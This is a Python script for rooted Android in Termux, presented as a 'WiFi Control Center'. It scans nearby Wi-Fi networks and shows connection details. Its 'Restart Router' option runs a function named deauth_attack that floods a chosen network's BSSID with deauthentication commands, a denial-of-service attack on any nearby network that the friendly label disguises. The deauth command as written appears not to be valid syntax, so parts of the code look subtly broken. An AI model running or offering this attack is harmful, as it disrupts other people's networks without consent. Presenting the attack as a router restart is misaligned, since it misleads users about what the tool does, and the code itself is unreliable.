#!/data/data/com.termux/files/usr/bin/python

import os
import time
import json
import subprocess
import argparse
from datetime import datetime

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    """Clear terminal screen"""
    os.system('clear')

def print_banner():
    """Print cool ASCII art banner"""
    banner = f"""{Colors.CYAN}
╔══════════════════════════════════════════╗
║     {Colors.YELLOW}▀▛▘  ▗  ▗▜▘▗     {Colors.CYAN}                   ║
║     {Colors.YELLOW}▌▞▀▖▄ ▄▐ ▐ ▄ ▄▌▗▘{Colors.CYAN}                   ║
║     {Colors.YELLOW}▌▌ ▌▐ ▐▐ ▐ ▐ ▛▌▜ {Colors.CYAN}                   ║
║     {Colors.YELLOW}▘▝▀ ▀▄▀▐▄▟▖▀▄▝▘▀▘{Colors.CYAN}                   ║
║        {Colors.BLUE}WiFi Control Center{Colors.CYAN}                  ║
╚══════════════════════════════════════════╝{Colors.RESET}"""
    print(banner)

def check_root():
    """Check if Termux has root access"""
    try:
        result = subprocess.run(['su', '-c', 'whoami'], 
                              capture_output=True, 
                              text=True)
        return result.stdout.strip() == 'root'
    except:
        return False

def check_tools():
    """Check if required tools are installed"""
    tools = ['nmap', 'iw']
    missing = []
    
    for tool in tools:
        try:
            subprocess.run([tool, '--help'], 
                         capture_output=True)
        except FileNotFoundError:
            missing.append(tool)
    
    if missing:
        print(f"\n{Colors.RED}Missing tools: {', '.join(missing)}{Colors.RESET}")
        print(f"\n{Colors.YELLOW}Installing required tools...{Colors.RESET}")
        try:
            subprocess.run(['pkg', 'install', 'root-repo'], check=True)
            subprocess.run(['pkg', 'install', 'nmap'], check=True)
            subprocess.run(['pkg', 'install', 'iw'], check=True)
            return True
        except:
            print(f"{Colors.RED}Failed to install tools{Colors.RESET}")
            return False
    return True

def get_interface():
    """Get wireless interface name"""
    try:
        result = subprocess.run(['su', '-c', 'iw dev'], 
                              capture_output=True, 
                              text=True)
        for line in result.stdout.split('\n'):
            if 'Interface' in line:
                return line.split('Interface')[1].strip()
        return None
    except:
        return None

def scan_networks():
    """Scan for WiFi networks using iw"""
    try:
        interface = get_interface()
        if not interface:
            print(f"{Colors.RED}No wireless interface found{Colors.RESET}")
            return None
            
        print(f"\n{Colors.YELLOW}Scanning for networks...{Colors.RESET}")
        
        # Put interface in monitor mode
        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
        subprocess.run(['su', '-c', f'iwconfig {interface} mode monitor'], check=True)
        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
        
        # Scan for networks
        result = subprocess.run(['su', '-c', f'iw dev {interface} scan'],
                              capture_output=True,
                              text=True)
        
        # Parse scan results
        networks = []
        current_network = {}
        
        for line in result.stdout.split('\n'):
            line = line.strip()
            if 'BSS' in line and '(' in line:
                if current_network:
                    networks.append(current_network)
                current_network = {'bssid': line.split('(')[0].split('BSS')[1].strip()}
            elif 'SSID: ' in line:
                current_network['ssid'] = line.split('SSID: ')[1]
            elif 'signal: ' in line:
                current_network['signal'] = line.split('signal: ')[1].split(' ')[0]
            elif 'freq: ' in line:
                current_network['freq'] = line.split('freq: ')[1]
                
        if current_network:
            networks.append(current_network)
            
        # Put interface back in managed mode
        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
        subprocess.run(['su', '-c', f'iwconfig {interface} mode managed'], check=True)
        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
        
        return networks
    except Exception as e:
        print(f"{Colors.RED}Error during scan: {str(e)}{Colors.RESET}")
        return None

def print_networks(networks):
    """Print available networks"""
    if not networks:
        print(f"\n{Colors.RED}No networks found{Colors.RESET}")
        return
        
    print(f"\n{Colors.BOLD}Available Networks:{Colors.RESET}")
    for i, net in enumerate(networks, 1):
        signal = float(net.get('signal', 0))
        signal_str = '▂▄▆█' if signal > -50 else '▂▄▆' if signal > -70 else '▂▄' if signal > -80 else '▂'
        print(f"{i}. {Colors.GREEN}{net.get('ssid', 'Hidden Network')}{Colors.RESET}")
        print(f"   ├─ BSSID: {net['bssid']}")
        print(f"   ├─ Signal: {signal_str} ({signal} dBm)")
        print(f"   └─ Freq: {net.get('freq', 'Unknown')} MHz")

def deauth_attack(interface, target_bssid):
    """Send deauth packets using custom method"""
    try:
        print(f"\n{Colors.YELLOW}Starting deauth attack...{Colors.RESET}")
        
        # Put interface in monitor mode
        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
        subprocess.run(['su', '-c', f'iwconfig {interface} mode monitor'], check=True)
        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
        
        # Create and send deauth packets
        for _ in range(10):  # Send 10 rounds of packets
            # Send deauth to broadcast
            subprocess.run(['su', '-c', 
                          f'iw dev {interface} mgmt deauth {target_bssid} reason 7'],
                         check=True)
            time.sleep(0.5)
            
        print(f"\n{Colors.GREEN}Deauth attack completed{Colors.RESET}")
        
        # Put interface back in managed mode
        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
        subprocess.run(['su', '-c', f'iwconfig {interface} mode managed'], check=True)
        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
        
        return True
    except Exception as e:
        print(f"{Colors.RED}Error during deauth: {str(e)}{Colors.RESET}")
        return False

def scan_network_info():
    """Scan detailed network information"""
    try:
        interface = get_interface()
        if not interface:
            print(f"{Colors.RED}No wireless interface found{Colors.RESET}")
            return
            
        print(f"\n{Colors.YELLOW}Scanning network info...{Colors.RESET}")
        
        # Get current connection info
        result = subprocess.run(['su', '-c', f'iw dev {interface} link'],
                              capture_output=True,
                              text=True)
        
        if 'Not connected' in result.stdout:
            print(f"\n{Colors.RED}Not connected to any network{Colors.RESET}")
            return
            
        # Parse connection info
        info = {}
        for line in result.stdout.split('\n'):
            line = line.strip()
            if 'Connected to' in line:
                info['bssid'] = line.split('Connected to')[1].strip()
            elif 'freq: ' in line:
                info['freq'] = line.split('freq: ')[1]
            elif 'signal: ' in line:
                info['signal'] = line.split('signal: ')[1].split(' ')[0]
            elif 'SSID: ' in line:
                info['ssid'] = line.split('SSID: ')[1]
                
        # Print info
        if info:
            print(f"\n{Colors.BOLD}Current Connection:{Colors.RESET}")
            print(f"├─ Network: {Colors.GREEN}{info.get('ssid', 'Unknown')}{Colors.RESET}")
            print(f"├─ BSSID:   {info.get('bssid', 'Unknown')}")
            print(f"├─ Signal:   {info.get('signal', 'Unknown')} dBm")
            print(f"└─ Freq:     {info.get('freq', 'Unknown')} MHz")
            
            # Get IP info
            ip_result = subprocess.run(['su', '-c', 'ip addr show ' + interface],
                                     capture_output=True,
                                     text=True)
            
            for line in ip_result.stdout.split('\n'):
                if 'inet ' in line:
                    ip = line.split('inet ')[1].split('/')[0]
                    print(f"\n{Colors.BOLD}IP Information:{Colors.RESET}")
                    print(f"└─ IP Address: {Colors.BLUE}{ip}{Colors.RESET}")
        
    except Exception as e:
        print(f"{Colors.RED}Error getting network info: {str(e)}{Colors.RESET}")

def restart_router():
    """Restart router using deauth attack"""
    if not check_root():
        print(f"\n{Colors.RED}⚠️ Root access required!{Colors.RESET}")
        print(f"{Colors.YELLOW}Please run Termux with root access{Colors.RESET}")
        return
        
    if not check_tools():
        return
        
    # Scan for networks
    networks = scan_networks()
    if not networks:
        return
        
    print_networks(networks)
    
    try:
        choice = int(input(f"\n{Colors.BOLD}Choose network to restart (1-{len(networks)}): {Colors.RESET}")) - 1
        if 0 <= choice < len(networks):
            target = networks[choice]
            interface = get_interface()
            
            if deauth_attack(interface, target['bssid']):
                print(f"\n{Colors.GREEN}✅ Network restart attempt completed{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}❌ Failed to restart network{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}Invalid choice!{Colors.RESET}")
    except ValueError:
        print(f"\n{Colors.RED}Invalid input!{Colors.RESET}")
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Operation cancelled{Colors.RESET}")

def print_menu():
    """Print interactive menu"""
    print(f"\n{Colors.BOLD}Options:{Colors.RESET}")
    print(f"1. {Colors.GREEN}Restart Router (requires root){Colors.RESET}")
    print(f"2. {Colors.YELLOW}Show WiFi Info{Colors.RESET}")
    print(f"3. {Colors.BLUE}Scan Networks{Colors.RESET}")
    print(f"4. {Colors.RED}Exit{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description='WiFi Control Center')
    parser.add_argument('-f', '--force', action='store_true', 
                       help='Force restart without confirmation')
    args = parser.parse_args()
    
    try:
        while True:
            clear_screen()
            print_banner()
            print_menu()
            
            choice = input(f"\n{Colors.BOLD}Choose an option (1-4):{Colors.RESET} ")
            
            if choice == '1':
                restart_router()
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '2':
                scan_network_info()
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '3':
                networks = scan_networks()
                if networks:
                    print_networks(networks)
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '4':
                print(f"\n{Colors.GREEN}Goodbye!{Colors.RESET}")
                break
            else:
                print(f"\n{Colors.RED}Invalid option!{Colors.RESET}")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {str(e)}{Colors.RESET}")

if __name__ == "__main__":
    main()
